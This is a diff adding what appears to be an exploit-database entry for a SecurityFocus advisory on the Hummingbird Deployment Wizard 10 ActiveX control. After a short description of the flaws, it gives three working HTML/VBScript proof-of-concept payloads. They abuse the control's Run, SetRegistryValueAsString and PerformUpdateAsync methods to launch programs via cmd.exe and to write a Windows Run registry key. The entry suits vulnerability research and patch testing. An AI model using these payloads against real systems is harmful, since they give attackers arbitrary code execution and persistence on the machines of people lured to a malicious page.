@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/31799/info
+
+Hummingbird Deployment Wizard 10 ActiveX control is prone to multiple vulnerabilities that attackers can exploit to run arbitrary code. The issues stem from insecure methods used within 'DeployRun.dll'.
+
+An attacker can exploit these issues by enticing an unsuspecting victim to visit a malicious HTML page.
+
+Successfully exploiting these issues allows remote attackers to edit registry key information or execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts will likely result in denial-of-service conditions.
+
+Hummingbird Deployment Wizard 10 10.0.0.44 is vulnerable; other versions may also be affected.
+
+<object classid='clsid:7F9B30F1-5129-4F5C-A76C-CE264A6C7D10' id='test'></object> <input language=VBScript onclick=tryMe() type=button value='Click here to start the test'> <script language='vbscript'> Sub tryMe test.Run "cmd.exe", "/C calc.exe" End Sub </script> <object classid='clsid:7F9B30F1-5129-4F5C-A76C-CE264A6C7D10' id='test'></object> <input language=VBScript onclick=tryMe() type=button value='Click here to start the test'> <script language='vbscript'> Sub tryMe 'test.SetRegistryValueAsString "Existing Registry Path + Existing Registry Key", "Value to change" test.SetRegistryValueAsString "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\YourFavouriteKey", "Hello World!" End Sub </script> <object classid='clsid:7F9B30F1-5129-4F5C-A76C-CE264A6C7D10' id='test' height='20' width='20'></object> <input language=VBScript onclick=tryMe() type=button value='Click here to start the test'> <script language='vbscript'> Sub tryMe test.PerformUpdateAsync "calc.exe" End Sub </script> 
